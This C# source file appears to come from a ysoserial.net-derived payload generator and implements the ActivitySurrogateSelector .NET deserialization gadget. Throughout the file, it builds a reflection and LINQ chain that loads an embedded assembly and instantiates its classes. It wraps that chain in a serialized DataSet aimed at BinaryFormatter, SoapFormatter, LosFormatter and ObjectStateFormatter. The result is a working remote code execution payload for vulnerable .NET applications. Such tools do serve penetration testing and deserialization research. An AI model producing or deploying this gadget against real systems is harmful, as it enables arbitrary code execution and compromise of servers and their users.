using System;
using System.Collections.Generic;
using System.Linq;
using System.Collections;
using System.ComponentModel.Design;
using System.Data;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.UI.WebControls;
using System.Runtime.Serialization;

namespace ysoserial_frmv2.Generators
{
    class MySurrogateSelector : SurrogateSelector
    {
        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)
        {
            selector = this;
            if (!type.IsSerializable)
            {
                Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                return (ISerializationSurrogate)Activator.CreateInstance(t);
            }

            return base.GetSurrogate(type, context, out selector);
        }

    }

    [Serializable]
    public class PayloadClass : ISerializable
    {
        protected byte[] assemblyBytes;
        public PayloadClass()
        {
            this.assemblyBytes = File.ReadAllBytes(typeof(ExploitClass).Assembly.Location);
        }

        protected PayloadClass(SerializationInfo info, StreamingContext context)
        {
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            System.Diagnostics.Trace.WriteLine("In GetObjectData");

            // Build a chain to map a byte array to creating an instance of a class.
            // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
            List<byte[]> data = new List<byte[]>();
            data.Add(this.assemblyBytes);
            var e1 = data.Select(Assembly.Load);
            Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
            var e2 = e1.SelectMany(map_type);
            var e3 = e2.Select(Activator.CreateInstance);

            // PagedDataSource maps an arbitrary IEnumerable to an ICollection
            PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
            // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
            // Class is internal so need to use reflection.
            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

            // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
            DesignerVerb verb = new DesignerVerb("XYZ", null);
            // Need to insert IDictionary using reflection.
            typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

            // Pre-load objects, this ensures they're fixed up before building the hash table.
            List<object> ls = new List<object>();
            ls.Add(e1);
            ls.Add(e2);
            ls.Add(e3);
            ls.Add(pds);
            ls.Add(verb);
            ls.Add(dict);

            Hashtable ht = new Hashtable();

            // Add two entries to table.
            ht.Add(verb, "Hello");
            ht.Add("Dummy", "Hello2");

            FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
            Array keys = (Array)fi_keys.GetValue(ht);
            FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
            for (int i = 0; i < keys.Length; ++i)
            {
                object bucket = keys.GetValue(i);
                object key = fi_key.GetValue(bucket);
                if (key is string)
                {
                    fi_key.SetValue(bucket, verb);
                    keys.SetValue(bucket, i);
                    break;
                }
            }

            fi_keys.SetValue(ht, keys);

            ls.Add(ht);

            // Wrap the object inside a DataSet. This is so we can use the custom
            // surrogate selector. Idiocy added and removed here.
            info.SetType(typeof(System.Data.DataSet));
            info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
            info.AddValue("DataSet.DataSetName", "");
            info.AddValue("DataSet.Namespace", "");
            info.AddValue("DataSet.Prefix", "");
            info.AddValue("DataSet.CaseSensitive", false);
            info.AddValue("DataSet.LocaleLCID", 0x409);
            info.AddValue("DataSet.EnforceConstraints", false);
            info.AddValue("DataSet.ExtendedProperties", (PropertyCollection)null);
            info.AddValue("DataSet.Tables.Count", 1);
            BinaryFormatter fmt = new BinaryFormatter();
            MemoryStream stm = new MemoryStream();
            fmt.SurrogateSelector = new MySurrogateSelector();
            fmt.Serialize(stm, ls);
            info.AddValue("DataSet.Tables_0", stm.ToArray());
        }
    }

    class ActivitySurrogateSelectorGenerator : GenericGenerator
    {
   
        public override string Description()
        {
            return "ActivitySurrogateSelector gadget by James Forshaw. This gadget ignores the command parameter and executes the constructor of ExploitClass class.";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "LosFormatter" };
        }

        public override string Name()
        {
            return "ActivitySurrogateSelector";
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            PayloadClass payload = new PayloadClass();
            return Serialize(payload, formatter, test);
        }
    }
}
